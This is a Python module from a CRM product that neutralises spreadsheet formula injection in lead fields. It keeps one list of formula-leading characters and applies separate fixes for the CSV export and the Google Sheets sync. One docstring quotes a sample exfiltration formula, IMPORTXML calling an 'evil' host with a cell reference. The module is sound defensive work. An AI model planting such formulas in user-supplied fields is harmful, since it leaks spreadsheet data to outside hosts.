"""One definition of "this cell could execute", and two renderings of the fix.

A lead's fields are caller-supplied — a name, a business, a note the agent transcribed —
and this product writes them into spreadsheets by two different routes: the CSV export a
client downloads and opens in Excel (`crm.service.export_leads_csv`), and the Google
Sheets sync (`integrations.service`). Both carry the identical value. Only the second one
was hardened, and the unhardened one is the file a human actually opens.

**Why this is a shared LEADER SET and not a shared function.** The obvious "one way per
problem" move is for both callers to use the Sheets `_disarm`, and it is wrong. The
leading apostrophe is Google Sheets' own "this is text" marker: Sheets consumes it, so
the cell still reads as a phone number. A CSV has no such convention — the apostrophe is
just a byte, so Excel renders `'=IMPORTXML(...)` with the quote VISIBLE, and every
ordinary value that happens to start with `-` (a negative number, a dash-led note) grows
a stray character in the client's own data. OWASP's CSV Injection page recommends the TAB
character (0x09) inside the quoted field for Excel specifically, and says plainly that
there is no universal sanitisation safe for every spreadsheet application and every
downstream consumer.

So the thing worth sharing is the DANGER, not the remedy: `FORMULA_LEADERS` is the single
list, and a newly discovered dangerous leader is added once. Each writer renders the
neutralisation its own consumer understands, and says which consumer it is written for.

**Full-width variants are in the set on purpose.** U+FF1D, U+FF0B, U+FF0D and U+FF20 —
the full-width forms of = + - @ — are interpreted as formula leaders in some locales, per
the same OWASP page. They are written as escapes below rather than pasted, because a
full-width glyph in source is indistinguishable from its ASCII twin to a reader (ruff's
RUF001 says the same thing). They cost nothing to include and are exactly the kind of gap
a reviewer never thinks to check.

**What this cannot promise.** OWASP also notes Excel may strip quoting when a file is
saved and re-opened, which can reactivate a previously escaped formula. That is a
property of the consumer, not of our output; the mitigation here is the standard one and
the residual risk is stated rather than hidden.

Sources read while writing this, so the next reader inherits the evidence:
  https://owasp.org/www-community/attacks/CSV_Injection
  https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection
"""

from __future__ import annotations

#: Every character that can begin an executable cell in a mainstream spreadsheet.
#: `\t` and `\r` are here because a value beginning with either can shift the parse of
#: the field that follows it, which is the same class of problem one layer down.
FORMULA_LEADERS: tuple[str, ...] = (
    "=",
    "+",
    "-",
    "@",
    "\t",
    "\r",
    # Full-width = + - @ — formula leaders in some locales (OWASP, above). Escapes,
    # not glyphs: the pasted characters are unreadable next to their ASCII twins.
    "\uff1d",
    "\uff0b",
    "\uff0d",
    "\uff20",
)


def leads_a_formula(rendered: str) -> bool:
    """Would a spreadsheet treat this value as the start of a formula?"""
    return rendered[:1] in FORMULA_LEADERS


def disarm_for_csv(rendered: str) -> str:
    """Neutralise for a CSV opened in Excel or LibreOffice — a TAB prefix.

    Written for the export a client downloads. The tab is preserved in the underlying
    data and can affect a downstream programmatic re-import, which is the trade OWASP
    names; for this file the human reader is the consumer, and a formula that runs when
    they double-click their own leads is the worse outcome by a distance.

    Deliberately NOT the leading apostrophe: a CSV has no text marker, so the quote would
    be visible in the cell, and it would appear on every ordinary value starting with a
    `-` — corrupting a client's data in the name of protecting it.
    """
    return f"\t{rendered}" if leads_a_formula(rendered) else rendered


def disarm_for_sheets(rendered: str) -> str:
    """Neutralise for the Google Sheets API — a leading apostrophe.

    Sheets' own "this is text" marker, which it consumes rather than displays, so a
    phone number still reads as a phone number while `=IMPORTXML("https://evil…"&A1)`
    — a name a caller can choose — stays a string instead of exfiltrating its row.
    Belt and braces with the `RAW` input option the writer already sends.
    """
    return f"'{rendered}" if leads_a_formula(rendered) else rendered


__all__ = ["FORMULA_LEADERS", "disarm_for_csv", "disarm_for_sheets", "leads_a_formula"]
